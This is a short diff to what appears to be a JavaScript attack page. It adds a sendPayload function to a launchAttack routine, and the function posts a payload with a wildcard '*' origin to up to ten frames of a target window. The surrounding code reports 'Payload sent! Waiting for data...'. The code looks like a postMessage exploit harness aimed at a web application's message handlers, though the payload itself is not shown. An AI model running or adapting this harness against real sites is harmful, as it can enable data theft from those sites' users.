@@ -222,6 +222,21 @@ function launchAttack() {
         showStatus('Payload sent! Waiting for data...', 'success');
 
     }, 5000);
+
+    function sendPayload() {
+      if (!w || w.closed) {
+        alert("Target window is not open.");
+        return;
+      }
+
+      for (let i = 0; i < 10; i++) {
+        try {
+          w.frames[i].postMessage(payload, '*');
+        } catch (e) {}
+      }
+
+      console.log('Payload sent');
+    }
 }
 </script>
 
